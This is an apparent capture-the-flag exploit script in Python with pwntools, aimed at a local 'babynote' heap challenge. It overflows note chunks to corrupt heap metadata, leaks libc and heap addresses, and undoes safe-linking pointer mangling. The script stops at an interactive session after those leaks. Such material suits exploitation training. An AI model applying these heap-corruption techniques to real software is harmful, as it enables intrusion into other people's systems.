#!/usr/bin/env python3
"""
BabyNote PoC - Test shared note between 2 connections
"""

from pwn import *
import struct

context.arch = 'amd64'
context.log_level = 'info'

BINARY = './babynote'

def add_note(p, size):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())

def edit_note(p, idx, data):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Data: ', data)

def view_note(p, idx):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())

def delete_note(p, idx):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())


def defuscate(x,l=64):
    p = 0
    for i in range(l*4,0,-4): # 16 nibble
        v1 = (x & (0xf << i )) >> i
        v2 = (p & (0xf << i+12 )) >> i+12
        p |= (v1 ^ v2) << i
    return p

def obfuscate(p, adr):
    return p^(adr>>12)


def main():
    log.info("=== BabyNote solver ===")
    
    log.info("Starting connection 1...")
    p1 = process(BINARY)
    #p1 = remote("localhost", 13373)

    log.info("Starting connection 2...")
    p2 = process(BINARY)
    #p2 = remote("localhost", 13373)

    log.info("Connection 1: Creating note with size 0x20...")
    add_note(p1, 0x20) #0
    add_note(p1, 0x20) #1
    add_note(p1, 0x20) #2
    for i in range(3):
        add_note(p1, 0x100) #3-5
    
    add_note(p1, 0xe0) #6
    log.info("Connection 1: Writing 'AAAA' to note...")
    edit_note(p1, 0, b'AAAA')
    
    log.info("Connection 1: Viewing note...")
    view_note(p1, 0)
    p1.recvuntil(b'Content: ')
    content1 = p1.recvline().strip()
    log.info(f"Connection 1 sees: {content1}")
    
    pause()
    add_note(p2, 0x100) #p2 0
    #now note 1 is overflow
    gdb.attach(p1, 'b*main')
    edit_note(p1, 0, b'A'*0x28+p64(0x481)+b'A'*0x28+p64(0x451))

    add_note(p1, 0x20) #7
    delete_note(p1, 0x1)
    add_note(p1, 0x20) #1

    leak = view_note(p1, 0x2)
    p1.recvuntil(b'Content: ')
    leak = u64(p1.recvn(6)+b'\x00'*2)
    log.info(f"Leak Libc {hex(leak)}")

    add_note(p1, 0x20) #8
    edit_note(p1, 8, b'X'*8)

    delete_note(p1, 7)
    
    delete_note(p1, 8)
    delete_note(p1, 1)
    view_note(p1, 2)
    p1.recvuntil(b'Content: ')
    heap = defuscate(u64(p1.recvn(6)+b'\x00'*2))
    log.info(f"Leak Heap {hex(heap)}")

    edit_note(p1, 0, b'A'*0x28+p64(0x31)+b'A'*8)



    p1.interactive()

if __name__ == '__main__':
    main()
